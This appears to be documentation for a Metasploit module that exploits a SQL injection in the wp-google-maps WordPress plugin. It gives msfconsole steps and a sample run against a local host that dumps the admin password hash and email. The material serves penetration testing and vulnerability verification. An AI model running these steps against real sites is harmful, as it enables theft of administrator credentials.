## Vulnerable Application

This module works against the Wordpress plugin `wp-google-maps` between 7.11.00 and 7.11.17 (included).

[The vulnerable version is available on WordPress' plugin directory](https://downloads.wordpress.org/plugin/wp-google-maps.7.11.17.zip).

## Verification Steps

  1. `msfconsole`
  2. `use auxiliary/admin/http/wp_google_maps_sqli`
  3. `set RHOSTS <rhost>`
  4. Set `DB_PREFIX` if necessary
  5. `run`

## Options

### `DB_PREFIX` 

Change the table prefix. By default, this option is set to `wp_`.

## Scenarios

### wp-google-maps 7.11.17 on WordPress 5.1.1

```
msf5 auxiliary(admin/http/wp_google_maps_sql_injection) > run
[*] Running module against 127.0.0.1

[*] 127.0.0.1:80 - Trying to retrieve the wp_users table...
[+] 127.0.0.1:80 - Found admin $P$Bbfp4csOlKV/XoKGjqViW1pWFzTlQz/ junk@junk.tld
[!] No active DB -- Credential data will not be saved!
[+] Credentials saved in: /home/user/.msf4/loot/2019(...).txt
[*] Auxiliary module execution completed
```
